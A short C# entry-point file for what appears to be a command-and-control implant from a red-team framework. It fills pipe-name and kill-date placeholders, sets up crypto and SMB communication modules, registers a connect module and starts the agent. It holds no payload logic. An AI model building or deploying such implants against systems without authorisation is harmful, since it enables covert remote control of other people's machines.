using Agent.Controllers;
using Agent.Models;
using Agent.Modules;

using System;

namespace Agent
{
    public class Agent
    {
        public Agent()
        {
            Execute();
        }

        static void Main(string[] args)
        {
            new Agent();
        }

        public static void Execute()
        {
            var config = new ConfigController();
            config.SetOption(ConfigSetting.PipeName, "<<PipeName>>");
            config.SetOption(ConfigSetting.KillDate, DateTime.Parse("<<KillDate>>"));

            var crypto = new CryptoController();

            var commModule = new SmbCommModule();
            commModule.Init(config, crypto);

            var agent = new AgentController(config, crypto, commModule);
            agent.Init();
            agent.RegisterAgentModule(new ConnectModule());
            agent.Start();
        }
    }
}